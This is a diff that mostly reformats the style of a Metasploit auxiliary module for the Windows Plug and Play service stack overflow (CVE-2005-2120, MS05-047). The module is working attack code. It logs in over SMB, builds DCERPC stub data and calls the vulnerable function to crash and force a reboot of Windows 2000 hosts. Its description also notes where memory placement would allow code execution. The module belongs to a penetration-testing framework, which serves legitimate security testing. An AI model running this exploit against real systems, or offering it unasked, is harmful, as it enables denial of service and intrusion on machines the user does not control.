@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -6,61 +7,56 @@
 require 'msf/core'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client
   include Msf::Auxiliary::Dos
 
   def initialize(info = {})
     super(update_info(info,
-      'Name'           => 'Microsoft Plug and Play Service Registry Overflow',
-      'Description'    => %q{
-          This module triggers a stack buffer overflow in the Windows Plug
-        and Play service. This vulnerability can be exploited on
-        Windows 2000 without a valid user account. Since the PnP
-        service runs inside the service.exe process, this module
-        will result in a forced reboot on Windows 2000. Obtaining
-        code execution is possible if user-controlled memory can
-        be placed at 0x00000030, 0x0030005C, or 0x005C005C.
-      },
-      'Author'         => [ 'hdm' ],
-      'License'        => MSF_LICENSE,
-      'References'     =>
-        [
-          [ 'CVE', '2005-2120' ],
-          [ 'MSB', 'MS05-047' ],
-          [ 'BID', '15065' ],
-          [ 'OSVDB', '18830' ]
-        ]
-      ))
+                      'Name'           => 'Microsoft Plug and Play Service Registry Overflow',
+                      'Description'    => %q(
+                          This module triggers a stack buffer overflow in the Windows Plug
+                        and Play service. This vulnerability can be exploited on
+                        Windows 2000 without a valid user account. Since the PnP
+                        service runs inside the service.exe process, this module
+                        will result in a forced reboot on Windows 2000. Obtaining
+                        code execution is possible if user-controlled memory can
+                        be placed at 0x00000030, 0x0030005C, or 0x005C005C.
+                      ),
+                      'Author'         => [ 'hdm' ],
+                      'License'        => MSF_LICENSE,
+                      'References'     =>
+                        [
+                          [ 'CVE', '2005-2120' ],
+                          [ 'MSB', 'MS05-047' ],
+                          [ 'BID', '15065' ],
+                          [ 'OSVDB', '18830' ]
+                        ]))
 
     register_options(
       [
-        OptString.new('SMBPIPE', [ true,  "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'browser']),
-      ], self.class)
+        OptString.new('SMBPIPE', [ true, "The pipe name to use (browser, srvsvc, wkssvc, ntsvcs)", 'browser'])
+      ], self.class
+    )
   end
 
-=begin
-
-/* Function 0x0a at 0x767a54a8 */
-long function_0a (
-  [in] [unique] [string] wchar_t * arg_00,
-  [out] [size_is(*arg_02)] [length_is(*arg_02)] wchar_t * arg_01,
-  [in,out] long * arg_02,
-  [in] long arg_03
-);
-
-=end
+  #
+  # /* Function 0x0a at 0x767a54a8 */
+  # long function_0a (
+  #   [in] [unique] [string] wchar_t * arg_00,
+  #   [out] [size_is(*arg_02)] [length_is(*arg_02)] wchar_t * arg_01,
+  #   [in,out] long * arg_02,
+  #   [in] long arg_03
+  # );
+  #
 
   def run
-
     # Determine which pipe to use
     pipe = datastore['SMBPIPE']
 
     print_status("Connecting to the SMB service...")
-    connect()
-    smb_login()
-
+    connect
+    smb_login
 
     # Results of testing on Windows 2000 SP0
     #  324 / 325 exception handled
@@ -87,7 +83,7 @@ long function_0a (
       NDR.long(4) +
       NDR.long(1) +
 
-    print_status("Calling the vulnerable function...")
+      print_status("Calling the vulnerable function...")
 
     begin
       dcerpc.call(0x0a, stubdata)
@@ -105,5 +101,4 @@ long function_0a (
 
     disconnect
   end
-
 end
